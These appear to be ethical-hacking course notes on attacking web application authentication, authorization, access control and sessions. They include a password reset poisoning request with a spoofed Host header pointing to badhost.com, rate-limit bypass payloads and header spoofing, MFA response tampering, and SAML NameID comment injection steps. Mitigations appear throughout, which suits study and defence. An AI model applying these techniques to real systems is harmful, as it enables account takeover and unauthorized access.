			- The first step is to acquire the source code of the target web application. Once obtained, carefully analyze the code to understand its components, frameworks, and overall functionality. This review helps identify potential vulnerabilities within the codebase. By examining the source code, you can uncover various security weaknesses, such as:
				- Bypassing client-side input validation
				- Submitting nonstandard or malformed data to the server
				- Manipulating client-side states or events
				- Directly invoking hidden functionalities within a component
			- Key Areas to Identify in a Source Code Review:
				- Client-side input validation and other security-related logic or events
				- Obfuscation or encryption techniques applied to client data before transmission to the server
				- Modifiable components with hidden client-side functionalities
				- References to server-side functionalities that may be exploited
	- Attack Authentication Mechanisms:
		- This exploit takes advantage of design and implementation flaws in web applications, such as failing to enforce strong password policies or securely transmit credentials, to bypass authentication mechanisms.
		- Web applications typically authenticate users through mechanisms such as login functionality. During security assessments, attackers seek authentication vulnerabilities, including weak passwords (e.g., short or blank passwords, common dictionary words, user names, or default credentials). Exploiting these weaknesses, attackers can gain unauthorized access using techniques such as network eavesdropping, brute-force attacks, dictionary attacks, cookie replay attacks, and credential theft.
		- Many authentication mechanisms in web applications suffer from design flaws. Attackers can identify and exploit these flaws to gain unauthorized access. Common issues include failure to enforce strong password policies, insecure transmission of credentials over the Internet, and weak authentication methods. Web applications often rely on username-password authentication, which, if poorly implemented, can be easily compromised.
		- Username Enumeration:
			- Attackers can enumerate usernames through two primary methods: verbose failure messages and predictable username patterns.
			- Verbose Failure Messages:
				- In a typical login system, users enter a username and password, sometimes along with additional information. If a login attempt fails, it indicates that at least one of the provided credentials is incorrect. However, if the application explicitly states which part of the login attempt was incorrect, attackers can use trial-and-error methods to guess valid usernames. This vulnerability provides an opportunity for exploitation.
				- Examples of verbose failure messages:
					- Account <username> not found
					- Incorrect password provided
					- Account <username> has been locked out
			- Predictable Usernames:
				- Some applications generate usernames based on predictable patterns, such as sequential numbering (e.g., user101, user102). Attackers can analyze these patterns to systematically determine valid usernames, making it easier to compile a list of all possible user accounts.
		- Password Attacks:
			- A password attack is an attempt to crack a user’s password using various techniques to gain unauthorized access to an application.
			- Passwords Cracking Methods:
				- Password functionality exploits
				- Password guessing
				- Brute-force attack
				- Dictionary attack
				- Exploiting password reset mechanisms
		- Session Attacks:
			- Attackers use various session-based attacks to compromise authentication mechanisms. Common types include:
			- Session Prediction: Attackers analyze the session ID generation process to predict valid session ID values. By successfully guessing a valid session ID, they can bypass authentication and gain unauthorized access to the application.
			- Session Brute-Forcing: Attackers systematically attempt multiple session ID values until they find a valid one. Once a correct session ID is identified, they can impersonate a legitimate user and access the application.
			- Session Poisoning: Attackers inject malicious content into a session to manipulate the user’s online experience, modify session data, or obtain unauthorized information.
		- Cookie Exploitation:
			- Attackers use various techniques to exploit cookies and compromise user sessions. Common types of cookie exploitation attacks include:
			- Cookie Poisoning: A type of parameter tampering attack where an attacker modifies cookie contents to extract unauthorized user information, potentially leading to identity theft.
			- Cookie Sniffing: An attacker intercepts a cookie containing a victim’s session ID while they are logged into a target website. The attacker then uses the stolen cookie to bypass authentication and access the victim’s account.
			- Cookie Replay: An attacker reuses a captured session cookie to impersonate a legitimate user and maintain unauthorized access. However, this attack ceases to work once the user logs out, invalidating the session.
		- Bypassing Authentication:
			- Attackers use various techniques to bypass authentication mechanisms, including:
			- Bypassing SAML-Based SSO: Exploiting misconfigurations in SAML (Security Assertion Markup Language) authentication, such as signature validation flaws, session expiration issues, session replays, or misdirected SAML messages, to bypass Single Sign-On (SSO) authentication.
			- Bypassing Rate Limits: Rate limiting restricts the number of login attempts within a specific timeframe to prevent unauthorized access and brute-force attacks. However, attackers can use various techniques, such as IP rotation, automation tools, or distributed attacks, to evade these restrictions and gain unauthorized access.
			- Bypassing Multi-Factor Authentication (MFA): Attackers exploit weaknesses in MFA implementations using methods such as phishing, social engineering, session hijacking, or exploiting vulnerabilities in authentication flows to bypass the MFA mechanism and gain unauthorized access to systems, applications, or data.
		- Design Flaws in Authentication Mechanisms:
			- Authentication mechanisms are often more vulnerable to attacks than other components of web application security. Applications typically validate users through login credentials, and even a minor weakness in this process can lead to serious consequences, such as granting unauthorized access to attackers.
			- Weak Password Policies: Many applications impose minimal restrictions on password strength, allowing users to set weak passwords such as blank or short values, common words, dictionary terms, usernames as passwords, or default credentials. These weak passwords can be easily guessed by attackers, making unauthorized access to application resources significantly easier.
			- Brute-Force Vulnerability: If an application does not impose restrictions on the number of failed login attempts, attackers can repeatedly try different password combinations until they succeed. Without measures such as account lockouts, CAPTCHA, or rate-limiting, even an inexperienced hacker can gain access through brute-force attacks.
			- Excessive Failure Details in Error Messages: Login forms typically require at least a username and password, and sometimes additional details such as date of birth, security questions, or OTPs. When authentication fails, applications should avoid providing overly specific error messages (e.g., "Incorrect username" or "Incorrect password"). If an application reveals which specific field is incorrect, attackers can use this information to enumerate valid usernames and other credentials, facilitating further attacks such as credential stuffing and social engineering.
			- Insecure Transmission of Credentials: If an application transmits sensitive information over an insecure HTTP connection, it becomes vulnerable to man-in-the-middle (MITM) attacks, allowing attackers to intercept and manipulate data. Even when using HTTPS, credentials can still be exposed if they are handled insecurely—for example, by passing login details as query string parameters or storing credentials in cookies without proper security controls.
			- Password Reset Mechanism: In most applications, the password reset mechanism is mandatory and periodically enforced to mitigate the risk of compromised passwords. Additionally, users can reset their passwords when they detect unauthorized activity to prevent further misuse. However, this feature can also be exploited. Vulnerabilities overlooked in the main login function may reappear in the password reset mechanism. Some common flaws include:
				- Displaying verbose error messages that confirm whether a username is valid.
				- Allowing unrestricted attempts to guess the “Existing Password” field.
				- Validating whether the “New Password” and “Confirm Password” fields match only after authenticating the existing password, making it possible for attackers to determine the current password.
			- Forgotten Password Mechanism: Similar to password resets, password recovery mechanisms often suffer from security flaws that are ignored in the main login function, such as username enumeration. Poor design choices in this feature can expose the entire authentication process to attacks. Some common vulnerabilities include:
				- Providing a secondary challenge (e.g., security questions) that can be guessed or bypassed.
				- Allowing unlimited attempts to recover a password, enabling attackers to brute-force their way through by guessing commonly used answers.
			- “Remember Me” Functionality: Many applications offer a "Remember Me" feature to improve user convenience by storing login credentials, preventing the need for repeated sign-ins. However, this functionality introduces security risks, as users can be targeted both locally (on their own devices) and remotely (if the stored credentials are compromised). Common vulnerabilities include:
				- Storing persistent cookies that, once initiated, are trusted by the application without revalidating credentials.
				- Attackers using common dictionary words or enumerated usernames to gain unauthorized access by exploiting stored session data.
			- User Impersonation: Some applications allow privileged users to impersonate other users to assist them in performing tasks. For example, customer support agents may log in on behalf of users to troubleshoot issues. However, weaknesses in the impersonation logic can lead to vertical privilege escalation, allowing attackers to gain full access to the application. If not properly secured, an attacker could exploit this feature to assume administrative control over user accounts.
			- Improper Validation of Credentials:
				- Proper authentication mechanisms enforce security measures such as minimum password length, case sensitivity (upper and lower case), and the inclusion of numeric and special characters. However, poorly designed authentication systems not only ignore these best practices but may also mishandle user input, weakening security.
				- For example, some applications:
					- Truncate passwords, evaluating only the first few characters.
					- Ignore case sensitivity, allowing passwords to be entered in any capitalization.
					- Strip out special characters before validating passwords.
				- Such flaws enable attackers to perform automated password-guessing attacks more efficiently, reducing the number of attempts needed to compromise an account.
			- Predictable Usernames and Passwords:
				- Some applications generate usernames based on predictable sequences, making it easy for attackers to enumerate valid usernames. If usernames follow a pattern (e.g., sequential numbers or company email formats), attackers can compile a list and use it for brute-force or credential-stuffing attacks.
				- Additionally, when initial passwords are distributed in bulk (e.g., to groups of users) using a predefined format, attackers can exploit this predictability to guess or derive passwords, particularly in intranet environments where such vulnerabilities are more common.
			- Insecure Distribution of Credentials:
				- Many applications deliver login credentials via SMS, email, or postal mail. In some cases, these communications also include URLs containing activation codes for resetting system-generated passwords.
				- If multiple activation URLs are sent to the same user—or if an attacker registers multiple accounts—they can analyze patterns in the activation codes, potentially deducing the structure of codes sent to other users. This vulnerability can allow attackers to gain unauthorized access to accounts before users have a chance to secure them.
		- Implementation Flaws in Authentication Mechanisms:
			- Even well-designed application security mechanisms can introduce vulnerabilities if improperly enforced. These mistakes can lead to information leakage, login bypasses, or even the complete compromise of the security module. Implementation flaws in authentication are particularly dangerous as they often go undetected in standard testing methods.
			- Common Implementation Flaws in Authentication Mechanisms:
			- Fail-Open Login Mechanism: This is a logic flaw that can severely impact authentication security. For example, if an application invokes db.getUser() and encounters an exception—such as a null pointer exception—it may still grant access, even when no valid username or password is provided. If the session relies on a specific user identity, it could allow unauthorized access to sensitive data or critical functionality, even when the authentication process is not fully completed.
			- Flaws in Multistage Login Functionality:
				- Multistage login mechanisms add an extra layer of security beyond traditional username-and-password models. These systems typically involve:
					- Username and password entry
					- A challenge-response verification (e.g., entering specific digits from a security code or answering a personal question)
					- A final validation step, such as input from a physical token
				- However, poor implementation of these stages can introduce logic defects, which may allow attackers to bypass certain security checks, predict challenge responses, or exploit inconsistencies in validation mechanisms.
			- Insecure Storage of Credentials:
				- Even if an authentication mechanism is functionally secure, improper credential storage can create severe vulnerabilities. Common issues include:
					- Storing credentials in plaintext rather than hashing them securely
					- Using weak or outdated encryption algorithms
					- Failing to implement proper salting and hashing techniques (e.g., bcrypt, Argon2)
    			- Such weaknesses enable attackers to execute brute-force or password-cracking attacks, potentially exposing user accounts.
		- Username Enumeration:
			- If a login error message specifies whether the username or password is incorrect, attackers can exploit this information through a trial-and-error approach.
			Example Scenario
			- Consider an attacker attempting to enumerate the username and password of "Rini Matthews" on WordPress.com:
				- The attacker first attempts to log in with "rini.matthews", receiving the error message:
				- "Invalid email or username."
				- On the second attempt, the attacker tries "rinimatthews" and receives a different message:
				"The password entered for the username is incorrect."
			- This confirms that "rinimatthews" is a valid username, allowing the attacker to focus on cracking the password.
			- Mitigation Considerations: Username enumeration from error messages is ineffective if the application enforces an account lockout policy, which temporarily disables an account after multiple failed login attempts.
			- Other Enumeration Techniques:
				- Some applications generate usernames sequentially (e.g., "user101," "user102"), making it easy for attackers to predict and enumerate valid usernames.
				- Automated tools like Burp Suite (portswigger.net) can be used to perform large-scale username enumeration attacks on vulnerable web applications.
		- Password Attacks:
			- Password Functionality Exploits
				- Password Changing: Identify the password change functionality within the application by analyzing its structure, either by exploring the application (spidering) or creating a login account. Test the "Old Password," "New Password," and "Confirm New Password" fields with random inputs and observe the error responses to uncover potential vulnerabilities.
				- Password Recovery: "Forgot Password" features typically challenge users to verify their identity. If the number of attempts is not restricted, an attacker can use social engineering techniques to guess the correct answer and bypass security. Additionally, some applications send a unique recovery URL or even the existing password to the attacker's specified email address if the challenge is successfully completed.
				- "Remember Me" Exploit: "Remember Me" functionality is often implemented using simple persistent cookies (e.g., RememberUser=jason) or session identifiers (e.g., RememberUser=ABY112010). Attackers can exploit this by enumerating usernames or predicting session identifiers, allowing them to bypass authentication and gain unauthorized access.
			- Password Brute-Forcing:
				- Brute-forcing is a method used to crack passwords by systematically trying all possible combinations. The difficulty of guessing a password increases with length and complexity—using a mix of uppercase and lowercase letters, numbers, and special characters significantly extends the time required to crack it. If strong password policies are enforced, brute-forcing becomes impractical, as it could take years to guess a sufficiently complex password.
				- Attackers leverage password cracking tools, such as Burp Suite, to automate brute-force attempts. Common techniques used for brute-forcing include password lists and password dictionaries.
				- Password List Attacks:
					- A password list consists of commonly used passwords, often derived from social engineering techniques and publicly leaked credential databases. Attackers compile lists based on frequently used words and personal information, such as: Birthdates, Street names, Nicknames, Anniversary dates, Phone numbers, PIN codes, Parents’ or friends’ names, Pet names.
					- By systematically testing passwords from the list, attackers attempt to find a match with the target user's credentials.
				- Password Dictionary Attacks:
					- A password dictionary is a collection of word and number combinations that are likely to be used as passwords. Unlike brute force attacks, which try every possible character combination, dictionary attacks focus on precompiled wordlists, making them more efficient.
					- Attackers create dictionaries using tools such as Wordlist Generator (GitHub) to perform automated dictionary-based password cracking.
				- Brute-Forcing Tools for Password Cracking - Burp Suite:
					- Burp Suite is an advanced security testing platform used for analyzing and attacking web applications. It provides a range of tools that assist in identifying and exploiting vulnerabilities.
					- Burp Suite Built-In Tools:
						- Intercepting Proxy – Inspects and modifies traffic between the browser and the target application.
						- Application-Aware Spider – Crawls content and functionality to map the application’s attack surface.
						- Web Application Scanner – Automates the detection of various security vulnerabilities.
						- Intruder Tool – Performs customized attacks to identify weaknesses.
						- Repeater Tool – Manipulates and resends individual requests for further analysis.
						- Sequencer Tool – Tests the randomness of session tokens to detect predictability issues.
			- Attacking the Password Reset Mechanism:
				- Insecure password management practices can lead to severe security vulnerabilities. One such vulnerability is password reset poisoning, where an attacker manipulates HTTP request headers—such as the Host header—to redirect password reset links to a malicious domain.
				- The password reset function is commonly used when a user forgets their credentials and requests a reset link via email. This link typically contains a one-time token, and clicking it redirects the user to a password reset page. If improperly implemented, this mechanism can be exploited by attackers.
				- Steps to Perform a Password Reset Poisoning Attack:
					- Obtain the Target's Email Address:
						- The attacker acquires the victim's email address through social engineering or OSINT (Open Source Intelligence) techniques.
					- Send a Password Reset Request with a Manipulated Host Header:
						- The attacker intercepts the password reset request and modifies the Host header to point to a malicious domain.
						- Example of a manipulated HTTP request:
							POST https://certifiedhacker.com/reset.php HTTP/1.1
							Accept: */*
							Content-Type: application/json
							Host: badhost.com
						- As a result, the reset link generated by the server becomes: https://badhost.com/reset-password.php?token=87654321-8765-8765-8765-10987654321
					- Wait for the Victim to Receive and Click the Modified Email Link:
						- The victim receives a legitimate-looking email containing the poisoned password reset URL.
						- If the victim clicks the malicious link, they are unknowingly redirected to the attacker's controlled domain.
					- Extract the Password Reset Token and Compromise the Account:
						- Once the victim interacts with the link, the attacker intercepts the password reset token and can use it to reset the victim’s password, taking full control of their account.
				- Mitigation Strategies:
					- To prevent password reset poisoning attacks, applications should:
					- Validate the Host Header and avoid relying on it for generating reset links.
					- Implement strict allowlists for trusted domains.
					- Use absolute URLs instead of dynamically constructing them based on request headers.
					- Enforce multi-factor authentication (MFA) to add an extra layer of security.
		- Session Attacks: Session ID Prediction & Brute-Forcing:
			- Whenever a user logs into a website, the server assigns a session ID to track their activities. This session ID remains valid until the user logs out, at which point the server issues a new session ID upon the next login. Attackers attempt to exploit this mechanism by predicting or brute-forcing session IDs to hijack user sessions.
			- Some web applications use fixed-length session IDs, which may follow a predictable pattern. If the session ID lacks sufficient randomness, attackers can analyze valid session IDs and generate new ones to gain unauthorized access.
			- Steps Involved in Session Attack:
				- Collect Valid Session IDs:
					- Attackers capture session IDs by sniffing traffic from authenticated users (e.g., using packet sniffers or MITM attacks).
				- Analyze the Session ID Generation Mechanism:
					- Attackers study how session IDs are generated, including:
					- Structure of the session ID
					- Information sources used (e.g., username, timestamp, client IP)
					- Encryption or hashing algorithms applied (if any)
				- Exploit Predictable Session IDs:
					- If an application generates session IDs using predictable values (e.g., usernames, sequential numbers, timestamps), attackers can systematically guess valid session IDs.
				- Brute-Force Session ID Values:
					- If prediction is not feasible, attackers use brute-force techniques to generate and test different session ID values until they successfully hijack a session.
			- Mitigation Strategies:
				- Use strong randomness in session ID generation to prevent prediction.
				- Encrypt session IDs to add an extra layer of security.
				- Implement session expiration and automatic logout for inactive users.
				- Monitor and restrict repeated login attempts to detect brute-force attacks.
		- Cookie Exploitation: Cookie Poisoning:
			- Cookies often transmit sensitive credentials from the client browser to the server. Attackers can easily modify these cookies to gain unauthorized access to the server or impersonate another user.
			- Client browsers use cookies to maintain session states while communicating over the stateless HTTP protocol. Servers associate unique sessions with individual users accessing a web application. However, if an attacker tampers with cookies or session data, they can inject malicious content, alter the user’s online experience, or obtain unauthorized information.
			- Cookies can store session-specific data such as user IDs, passwords, account numbers, shopping cart contents, private information, and session identifiers. These cookies are stored either in the client’s computer memory or on its hard disk. By modifying cookie data, an attacker may gain escalated access privileges or manipulate a user's session for malicious purposes.
			- Many websites offer a "Remember me?" feature that stores user credentials in a cookie, preventing users from re-entering their details on every visit. Any private information entered is stored within these cookies. To enhance security, developers often encode cookies. However, encoding merely provides a false sense of security, as encoding methods such as Base64 and ROT13 can be easily reversed.
			- Steps in Cookie Poisoning:
				- Steal the cookie: If the cookie contains passwords or session identifiers, an attacker can obtain it using techniques such as script injection or eavesdropping.
				- Replay the cookie: The attacker reuses the stolen cookie, either with the same or altered credentials, to bypass web application authentication.
				- Intercept cookies: Tools like OWASP Zed Attack Proxy and Burp Suite can be used to capture and analyze cookies.
			- Cookie Exploitation Tools:
				- OWASP Zed Attack Proxy (ZAP) (www.zaproxy.org): OWASP ZAP is an integrated penetration testing tool for web applications. It offers automated scanners and a suite of tools for manually identifying security vulnerabilities.
				- L0phtCrack (l0phtcrack.gitlab.io)
				- Burp Suite (www.portswigger.net)
				- XSSer (xsser.03c8.net)
		- Bypassing Authentication: Bypassing SAML-Based SSO:
			- The Single Sign-On (SSO) authentication process allows users to sign in to an application using a single set of credentials. This same login session can then be used to access multiple applications across different domains or platforms. For example, when a user logs in with their Google account on a desktop or mobile device, they are automatically authenticated for services such as Google Drive, YouTube, and Gmail. This authentication mechanism across applications is facilitated using the Security Assertion Markup Language (SAML) protocol.
			- SAML is an XML-based framework that enables authentication and authorization between two entities: the Identity Provider (IdP) and the Service Provider (SP). The SP relies on the IdP to validate users and, upon successful authentication, the IdP sends a SAML assertion (a confirmation message) to the SP.
			- Traditionally, applications handled authentication before granting users access to protected functions. However, with the rise of SSO infrastructure, authentication is now managed by third-party identity providers, while service providers grant access based on SAML messages exchanged between them. These SAML messages are encoded using Base64, making them easy for attackers to decode and analyze.
			- Two critical fields in SAML messages are vulnerable to manipulation:
				- Signature: Establishes trust between the SP and IdP.
				- Assertion: Directs the SP on whether to grant access to a user.
			- SAML-Based SSO Exploitation:
				- Attackers can exploit various weaknesses in SAML-based authentication, such as:
				- Signature misconfigurations: Allowing attackers to modify SAML assertions.
				- Session expiration bypass: Exploiting long-lived session tokens.
				- Session replay attacks: Reusing intercepted SAML responses to gain unauthorized access.
				- Misdirected SAML messages: Redirecting authentication responses to unintended recipients.
			- Tools for Bypassing SAML-Based SSO:
				- SAML Raider: A Burp Suite extension used for SAML security testing. It enables attackers to:
					- Modify SAML messages to bypass authentication.
					- Manage and manipulate X.509 certificates used for signing SAML responses.
			- Using SAML Raider:
				- Configure Burp Suite:
					- Set up your browser to route traffic through Burp Suite.
					- Open Burp Suite, create a new project, and navigate to the "Proxy" tab to ensure the proxy is activated.
				- Install the SAML Raider Extension:
					- In Burp Suite, go to the "Extender" tab.
					- Open the "BApp Store", find "SAML Raider", and install the extension.
				- Intercepting Requests with Burp Suite:
					- In the "Proxy" tab, ensure that "Intercept is on" to capture and modify requests sent to the server.
					- When the user accesses a secured registration page (e.g., admin@xyz.org), Burp Suite will detect and intercept the request, passing it to the Identity Provider (IdP) system.
				- Capturing SAML Data:
					- When Burp Suite detects SAML-related data, a "SAML Raider" tab appears.
					- Users may need to send additional requests before the SAML Raider tab is populated. Clicking "Forward" will allow navigation to the IdP login page.
				- Intercepting the Login Request:
					- After entering credentials (e.g., admin@xyz.org.fakedomain.com), Burp Suite intercepts web requests.
					- Continue clicking "Forward" until the SAML Raider tab appears, showing intercepted SAML responses from the IdP.
				- Modifying the SAML Response:
					- Examine the response to locate the "NameID" field, found beneath the Key and Signature sections.
					- Insert a custom comment between two domain names and pass the response.
					- Since the signature remains valid, the Service Provider (SP) accepts and processes the first value in the NameID field (e.g., admin@xyz.org).
			- Exploitation Technique: Attackers leverage this method to bypass SAML-based SSO authentication by modifying SAML responses while maintaining a valid signature, thereby gaining unauthorized access.
		- Bypassing Authentication: Bypassing Rate Limits:
			- Rate limiting is a security mechanism designed to prevent attacks on a system or application by restricting the number of login attempts a user or entity can make within a specific time frame. This mechanism is implemented to defend against brute-force attacks, where an attacker systematically attempts to guess usernames and passwords to gain unauthorized access.
			- However, attackers can leverage various rate limit bypass techniques to circumvent these restrictions, including:
				- Exploring Different Endpoints and Parameters:
					- Attackers attempt brute-force attacks by targeting different versions of the intended endpoint. For example, instead of attacking /api/v3/sign-up, they may test alternative variations such as:
						- /Sign-up
						- /SignUp
						- /signup
						- /api/v1/sign-up
						- /api/sign-up
					- By cycling through different endpoint formats, attackers can evade rate-limiting measures applied to specific URLs.
				- Injecting Blank Characters into Code or Parameters:
					- Attackers may insert blank bytes such as %00, %0d%0a, %0d, %0a, %09, %0C, or %20 into input parameters to bypass authentication restrictions.
					- For example, modifying a request parameter like: code=5678%0a can introduce newline characters, which may help bypass rate-limiting rules. Similarly, appending a null byte (%00) to an email address or other input fields can sometimes trick the system into resetting or ignoring rate limits.
				- Altering the IP Origin Using HTTP Headers:
					- Attackers manipulate HTTP headers to spoof their IP address, making requests appear as if they originate from different sources. This technique allows them to bypass IP-based rate limits. Key headers that can be modified include:
						- X-Originating-IP
						- X-Forwarded-For
						- X-Remote-IP
						- X-Remote-Addr
						- X-Client-IP
						- X-Host
						- X-Forwarded-Host
			- Advanced Header Manipulation Techniques:
				- Using Multiple X-Forwarded-For Headers – Some systems process only the first or last occurrence of this header. Adding multiple instances can help bypass rate limits.
				- Switching IP Addresses After Reaching the Limit – If a system limits requests to 20 per account, attackers can rotate IP addresses to continue the attack undetected.
			- Conclusion: By exploiting these techniques, attackers can bypass rate-limiting protections, making brute-force and other automated attacks more effective. Proper mitigation strategies, such as CAPTCHAs, strict header validation, IP reputation checks, and device fingerprinting, are crucial to enhancing authentication security.
		- Bypassing Authentication: Bypassing Multi-Factor Authentication (MFA):
			- MFA bypass refers to techniques used to circumvent multi-factor authentication mechanisms, allowing unauthorized access to systems, applications, or data. MFA enhances security by requiring users to verify their identity using multiple independent authentication factors, such as passwords, OTPs (one-time passwords), biometrics, or security tokens. However, attackers can exploit various vulnerabilities to bypass MFA protections.
			- Techniques to Bypass Multi-Factor Authentication:
				- HTTP Response Body Manipulation:
					- Attackers inspect the response of an MFA request and attempt to modify key parameters to bypass the authentication check. If the response contains "success": false, they may alter it to "success": true" to see if it grants access.
					- Example:
						- Valid request with incorrect OTP:
							POST /otp-verify  
							Host: certifiedhacker.com  
							<redacted_headers>  
							{"otp": 50563}
						- Valid response (denied access):
							{
							"success": false
							}
						- Tampered response (bypassing authentication):
							{
							"success": true
							}
					- If the application fails to verify the server-side response properly, this manipulation may allow the attacker to bypass MFA.
				- Status Code Manipulation:
					- If a request with an incorrect OTP returns an error status code such as 400, 401, 402, or 403 with an "Invalid Token" message, an attacker may attempt to modify the response status to 200 OK and change the success flag to "success": true".
					- Example:
						- Valid request with incorrect OTP:
							POST /otp-verify  
							Host: certifiedhacker.com  
							<redacted_headers>  
							{"otp": 50563}
						- Valid response (access denied):
							HTTP/1.1 403 Forbidden  
							Content-Type: application/json  
							{
							"error": true,
							"message": "Invalid Token"
							}
						- Tampered response (bypassing authentication):
							HTTP/1.1 200 OK  
							Content-Type: application/json  
							{
								"success": true
							}
					- If the application only checks for a 200 OK response without verifying the actual server-side logic, an attacker may gain unauthorized access.
				- Conclusion: These attack techniques exploit weak server-side validation and improper handling of authentication responses. Organizations should implement server-side validation, encrypted communication, secure token verification, and additional security measures to prevent MFA bypass attempts.
	- Attack Authorization Schemes:
		- A web application contains an authorization mechanism that restricts access to specific resources or functionalities (e.g., an Admin page) for authenticated users. The web application always performs user authorization after authentication. An attacker exploits flaws in the authorization mechanism to escalate privileges and gain unauthorized access to restricted pages. The attacker attempts to retrieve information without proper credentials, using various techniques to bypass the web application's authorization schemes.
		- Authorization Attacks:
			- In an authorization attack, the attacker first identifies a legitimate account with limited privileges, logs in as that user, and then gradually escalates privileges to access protected resources. The attacker manipulates HTTP requests to bypass the application’s authorization mechanisms by modifying input fields related to the user ID, username, access group, cost, file names, file identifiers, etc.
			- Attackers leverage various sources, including uniform resource identifiers (URIs), parameter tampering, POST data, HTTP headers, query strings, cookies, and hidden tags, to carry out authorization attacks.
    		- Uniform Resource Identifier (URI): A URI is a global identifier for internet resources, whether accessed remotely or locally. An attacker may use URIs to access protected documents or directories, inject SQL queries or other unintended commands into an application, or redirect users to malicious sites linked to another server.
    		- Parameter Tampering: This involves manipulating parameters exchanged between the client and server to alter application data, such as product prices, quantities, user permissions, or credentials. Such data is often stored in cookies, URL query strings, or hidden form fields, which attackers modify to gain unauthorized control over the application.
    		- POST Data: POST requests typically contain authorization and session information, as the data provided by the client must be linked to a session. Attackers exploit vulnerabilities in POST data to manipulate session information and authorization controls.
    		- HTTP Headers: Web browsers do not allow direct modification of HTTP headers. To bypass this restriction, attackers either create custom programs or use specialized tools to alter headers and manipulate requests. An authorization HTTP header typically contains a Base-64 encoded username and password. Attackers can compromise this header by submitting multiple HTTP requests within the same header. In such cases, a proxy system processes the first request while the target system executes the second, effectively bypassing the proxy’s access control.
    		- Query Strings and Cookies: Browsers use cookies to maintain session states in the otherwise stateless HTTP protocol. Cookies store user preferences, session tokens, and other data. Attackers can modify cookies and send altered requests to the server, potentially tampering with session tokens or authorization data. The impact of cookie modification depends on how the application utilizes cookies, whether for authentication, session management, or authorization decisions.
    		- Hidden Tags: In HTML forms, user selections and input values are often stored as hidden fields and sent to the application via HTTP requests (GET or POST). Since hidden fields are not displayed on the webpage, users typically do not interact with them directly. However, attackers can manipulate hidden field values to gain unauthorized access or alter application behavior. Because client-side code lacks inherent security, attackers can exploit these hidden fields to access restricted pages or execute unauthorized actions within the browser.
		- Authorization Attack: HTTP Request Tampering: 
			- HTTP headers control the information exchanged between web clients and web servers in HTTP requests and responses. Each header consists of a single text line containing a name and a value. There are two primary ways to send data via HTTP: through the URL or a form.
			- Tampering with HTTP data involves modifying the content of an HTTP request (or response) before it is processed by the recipient. Attackers exploit this technique to bypass security mechanisms without requiring another user's credentials.
			- Query String Tampering:
				- If the query string is visible in the browser's address bar, an attacker may attempt to modify its parameters to bypass authorization controls. Web spidering tools, such as Burp Suite, can be used to scan the web application for POST parameters that might be vulnerable to manipulation.
			- HTTP Header Tampering:
				- If the application relies on the Referer header for access control, an attacker can modify it to gain unauthorized access to restricted functionalities.
				- For example, consider the following scenario where access to an item (ItemID = 201) is restricted unless the Admin parameter is set to true:
					GET /items?ItemID=201 HTTP/1.1
					Host: example.com
					Referer: http://example.com/dashboard?Admin=false
				- By altering the Admin parameter in the request, the attacker may gain access to protected resources:
					GET /items?ItemID=201 HTTP/1.1
					Host: example.com
					Referer: http://example.com/dashboard?Admin=true
				- Such vulnerabilities arise when applications make security decisions based on easily manipulated client-side data.
		- Authorization Attack: Cookie Parameter Tampering:
			- Cookie parameter tampering is a technique used to modify cookies set by a web application to carry out malicious attacks. When a user logs into a website, the web application generates a session cookie and stores it in the browser. Attackers exploit insecure cookie handling to manipulate session data and gain unauthorized access.
			- Steps for Cookie Parameter Tampering:
				- Collect and Analyze Cookies:
					- Gather session cookies set by the web application.
					- Analyze them to understand the cookie generation mechanism and identify potential vulnerabilities.
				- Tamper with Cookie Parameters:
					- Intercept session cookies using tools such as Burp Suite.
					- Modify cookie parameters and replay the altered cookie to the application to gain unauthorized access to other users’ profiles.
				- Intercept and Replace Cookies:
					- The tool intercepts each request sent from the browser and allows the attacker to edit cookies.
					- If the cookie is not securely generated, the attacker may be able to guess or manipulate its parameters to escalate privileges.
			- Burp Suite (portswigger.net): Burp Suite is an integrated platform for security testing of web applications. It provides various tools that work together to support the entire testing process, from initial mapping and analysis of an application's attack surface to identifying and exploiting security vulnerabilities.
	- Attack Access Controls:
		- Access controls are a critical part of an application's security mechanisms, relying on authentication and session management to regulate user access. Attackers analyze a website to identify vulnerabilities in access controls, focusing on the following aspects:
			- Individual access to specific subsets of data
			- Levels of access granted to different user roles (e.g., employees, managers, supervisors, CEOs)
			- Administrator functionalities for configuration and monitoring
			- Features that allow privilege escalation
		- Exploiting Insecure Access Controls:
			- Parameter-Based Access Control:
				- Web applications use various request parameters, such as cookies and query strings, to determine access permissions. These parameters often differ between regular users and administrators. In some cases, certain parameters are hidden from normal users and visible only to administrators. If an attacker can identify administrator-specific parameters, they can manipulate their own requests to include these parameters and gain unauthorized administrative access
			- Referer-Based Access Control:
				- Some web applications rely on the HTTP Referer header to enforce access control. However, the Referer header is inherently insecure, as attackers can easily modify it to bypass restrictions and gain unauthorized access to protected resources.
			- Location-Based Access Control:
				- Applications may restrict access based on a user's geographic location, typically determined through the user's IP address.
				- Attackers can bypass these controls by using techniques such as:
					- Web proxies to route traffic through different locations
					- VPNs to mask their real IP address
					- Data roaming on mobile devices to switch between different network regions
					- Direct manipulation of client-side mechanisms that control location-based access
		- Access Control Attack Methods:
			- Attacking with Different User Accounts:
				- Attempt to access the application using multiple user accounts. If the web application has broken access controls, you may be able to access restricted resources and functionalities as a legitimate but unauthorized user. Tools like Burp Suite can help compare access levels between different user contexts to identify security gaps.
			- Attacking Multistage Processes:
				- The above technique may be ineffective if the web application employs a multistage process, where users must perform multiple steps at different levels to complete an action. Since multiple requests are sent to the server throughout this process, attackers need to capture and analyze each request to test for access control vulnerabilities.
				- A manual approach to attacking a multistage process includes:
					- Walking through the protected process multiple times in a browser.
					- Using proxy tools to intercept session tokens and replace them with those of a lower-privileged user.
			- Attacking Static Resources:
				- Some web applications expose protected static resources via direct URLs. An attacker can attempt to request these URLs directly to check if unauthorized users can access them without proper authentication or authorization.
			- Attacking Direct Access to Methods:
				- Certain web applications accept direct requests to server-side APIs or methods. If these methods lack proper access control, attackers can exploit them to bypass security restrictions and gain unauthorized access to sensitive system functions.
			- Attacking Restrictions on HTTP Methods:
				- Testing various HTTP methods (e.g., GET, POST, PUT, DELETE, TRACE, and OPTIONS) is crucial in identifying security flaws. Attackers manipulate HTTP methods to see if the application improperly accepts or processes unauthorized requests. If access controls fail to restrict these methods appropriately, attackers can exploit them to bypass security measures and compromise the application.
	- Attack Session Management Mechanisms:
		- Web application session management involves exchanging sensitive information between the server and its clients when required. If session management is insecure, attackers can exploit vulnerabilities to compromise the web application. Since session management is a critical security component in most web applications, attackers frequently target it to launch malicious attacks.
